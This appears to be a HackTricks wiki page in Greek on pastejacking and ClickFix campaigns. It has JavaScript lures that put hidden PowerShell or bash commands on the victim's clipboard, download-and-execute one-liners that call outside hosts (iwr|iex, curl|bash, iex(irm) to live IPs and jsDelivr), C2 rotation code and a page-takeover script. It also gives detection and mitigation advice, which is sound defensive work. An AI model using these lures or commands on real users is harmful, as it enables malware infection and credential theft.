# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Μην επικολλάτε τίποτα που δεν έχετε αντιγράψει εσείς οι ίδιοι." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Clipboard hijacking – επίσης γνωστό ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγξουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον με υποστήριξη JavaScript, όπως μια Electron ή Desktop εφαρμογή) τοποθετεί προγραμματικά κείμενο υπό τον έλεγχο του επιτιθέμενου στο σύστημα πρόχειρου. Τα θύματα παροτρύνονται, συνήθως με προσεκτικά σχεδιασμένες οδηγίες social-engineering, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα τερματικό και να *επικολλήσουν* το περιεχόμενο του πρόχειρου, εκτελώντας άμεσα αυθαίρετες εντολές.

Επειδή **δεν γίνεται λήψη αρχείου και δεν ανοίγεται κανένα συνημμένο**, η τεχνική παρακάμπτει τους περισσότερους ελέγχους ασφαλείας e-mail και web-content που παρακολουθούν συνημμένα, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing καμπάνιες που διανέμουν κοινές οικογένειες malware όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Ορισμένα macOS infostealers κλωνοποιούν sites εγκαταστατών (π.χ. Homebrew) και **επιβάλλουν τη χρήση ενός κουμπιού “Copy”** ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η εγγραφή στο πρόχειρο περιέχει την αναμενόμενη εντολή εγκατάστασης συν ένα επικολλημένο Base64 payload (π.χ. `...; echo <b64> | base64 -d | sh`), έτσι μια μόνο επικόλληση εκτελεί και τα δύο ενώ το UI κρύβει το επιπλέον στάδιο.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Το ενέσιμο JavaScript της **ClearFake** καλεί τον helper `unsecuredCopyToClipboard()` που αθόρυβα αποθηκεύει ένα Base64-encoded PowerShell one-liner στο clipboard.
3. Οι οδηγίες HTML λένε στο θύμα: *“Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.”*
4. Το `powershell.exe` εκτελείται, κατεβάζοντας ένα archive που περιέχει ένα νόμιμο εκτελέσιμο και ένα κακόβουλο DLL (classic DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εγχέει shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά εκτελώντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Η κακόβουλη DLL επιλύει δυναμικά APIs χρησιμοποιώντας **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας rolling XOR key `"https://google.com/"`, ενέχει το τελικό shellcode και αποσυμπιέζει την **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Αποκτά ένα MSI payload → αποθέτει libcef.dll δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση του **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω `extrac32` και συνένωσης αρχείων και τελικά εκτελεί ένα `.a3x` script που εξάγει διαπιστευτήρια browser στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τα file downloads και ζητούν από τα θύματα να επικολλήσουν ένα one‑liner που ανακτά και εκτελεί JavaScript μέσω WSH, εγκαθίσταται μόνιμα και αλλάζει το C2 καθημερινά. Παράδειγμα της αλυσίδας που παρατηρήθηκε:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- URL με απόκρυψη που αντιστρέφεται κατά το runtime για να αποφεύγεται η επιφανειακή επιθεώρηση.
- Το JavaScript διατηρείται μέσω ενός Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα – επιτρέποντας γρήγορο domain rotation.

Ελάχιστο JS απόσπασμα που χρησιμοποιείται για την περιστροφή των C2s με βάση την ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιδρύει persistence και τραβάει ένα RAT (π.χ. PureHVNC), συχνά κάνοντας pin το TLS σε ένα hardcoded certificate και chunking την κίνηση.

Detection ideas specific to this variant
- Δέντρο διαδικασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Startup artifacts: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που καλεί WScript/CScript με JS path κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και τηλεμετρία γραμμής εντολών που περιέχει `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για να τροφοδοτήσουν μακριά scripts χωρίς μεγάλες εντολές γραμμής.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` κάτω από ένα updater‑looking task/path (π.χ., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Καθημερινά περιστρεφόμενα C2 hostnames και URLs με το pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχέτιση γεγονότων εγγραφής στο clipboard που ακολουθούνται από Win+R paste και άμεση εκτέλεση `powershell.exe`.

Τα blue‑teams μπορούν να συνδυάσουν clipboard, process‑creation και registry τηλεμετρία για να εντοπίσουν κατάχρηση pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` κρατά ιστορικό των **Win + R** εντολών – ψάξτε για ασυνήθιστα Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` στο { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινά φακέλους αμέσως πριν το ύποπτο 4688 event.
* EDR clipboard sensors (if present) – συσχετίστε `Clipboard Write` ακολουθούμενο άμεσα από νέο PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες καμπάνιες παράγουν μαζικά ψεύτικες CDN/browser verification σελίδες ("Just a moment…", IUAM-style) που εξαναγκάζουν χρήστες να αντιγράψουν OS-specific commands από το clipboard τους σε native κονσόλες. Αυτό μεταφέρει την εκτέλεση έξω από το browser sandbox και δουλεύει σε Windows και macOS.

Key traits of the builder-generated pages
- Ανίχνευση OS μέσω `navigator.userAgent` για προσαρμογή των payloads (Windows PowerShell/CMD vs. macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα OS προκειμένου να διατηρηθεί η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard σε benign UI actions (checkbox/Copy) ενώ το ορατό κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Mobile blocking και ένα popover με βήμα‑βήμα οδηγίες: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Προαιρετική obfuscation και single-file injector για overwrite του DOM ενός compromised site με ένα Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του terminal, μειώνοντας τα ορατά artifacts.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης & καταδίωξης ειδικές για δολώματα τύπου IUAM
- Web: Σελίδες που συζεύγνουν το Clipboard API με widgets επαλήθευσης; ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace σε ύποπτα περιβάλλοντα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά αλληλεπίδραση με τον browser; batch/MSI installers εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που δημιουργούν `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events; εργασίες παρασκηνίου που επιβιώνουν μετά το κλείσιμο του τερματικού.
- Συσχετίστε το ιστορικό `RunMRU` (Win+R) και τις εγγραφές clipboard με την επακόλουθη εκκίνηση κονσολικών διεργασιών.

Δείτε επίσης για υποστηρικτικές τεχνικές

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 ψευδές CAPTCHA / ClickFix εξελίξεις (ClearFake, Scarlet Goldfinch)

- ClearFake συνεχίζει να παραβιάζει WordPress sites και να εισάγει loader JavaScript που συνδέει εξωτερικούς hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη και blockchain “etherhiding” κλήσεις (π.χ. POSTs σε Binance Smart Chain API endpoints όπως `bsc-testnet.drpc[.]org`) για να τραβήξει την τρέχουσα λογική δολώματος. Πρόσφατα overlays χρησιμοποιούν έντονα ψευδείς CAPTCHAs που οδηγούν τους χρήστες να αντιγράψουν/επικολλήσουν μια one-liner (T1204.004) αντί να κατεβάσουν οτιδήποτε.
- Η αρχική εκτέλεση ανατίθεται όλο και περισσότερο σε signed script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs` που εκτελείται μέσω `WScript.exe`, περνώντας PowerShell-like ορίσματα με aliases/wildcards για να φέρουν απομακρυσμένο περιεχόμενο:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και χρησιμοποιείται κανονικά από το App‑V· σε συνδυασμό με το `WScript.exe` και ασυνήθιστα επιχειρήματα (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) γίνεται ένα high-signal LOLBAS στάδιο για ClearFake.
- Φεβρουάριος 2026: τα fake CAPTCHA payloads επέστρεψαν σε καθαρά PowerShell download cradles. Δύο ζωντανά παραδείγματα:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Η πρώτη αλυσίδα είναι ένας in-memory `iex(irm ...)` grabber· η δεύτερη κάνει stage μέσω `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1` και στη συνέχεια το εκκινεί με `-ep bypass` σε ένα κρυφό παράθυρο.

Detection/hunting tips for these variants
- Ακολουθία διεργασιών: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από εγγραφές στο πρόχειρο ή χρήση Win+R.
- Λέξεις-κλειδιά γραμμής εντολών: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ή ωμές διευθύνσεις IP / patterns `iex(irm ...)`.
- Δίκτυο: εξερχόμενες συνδέσεις προς CDN worker hosts ή blockchain RPC endpoints από script hosts/PowerShell σύντομα μετά την πλοήγηση στο web.
- Αρχείο/μητρώο: δημιουργία προσωρινού `.ps1` κάτω από `%TEMP%` καθώς και RunMRU εγγραφές που περιέχουν αυτά τα one-liners· αποκλείστε/δημιουργήστε ειδοποίηση για signed-script LOLBAS (WScript/cscript/mshta) που εκτελούνται με εξωτερικά URLs ή obfuscated alias strings.

## Μέτρα αντιμετώπισης

1. Browser hardening – απενεργοποιήστε την πρόσβαση εγγραφής στο πρόχειρο (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – εκπαιδεύστε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να αποκλείσουν αυθαίρετα one-liners.
4. Έλεγχοι δικτύου – μπλοκάρετε εξερχόμενες αιτήσεις προς γνωστές pastejacking και malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix αφού δελεάσει χρήστες σε έναν κακόβουλο server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Αναφορές

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
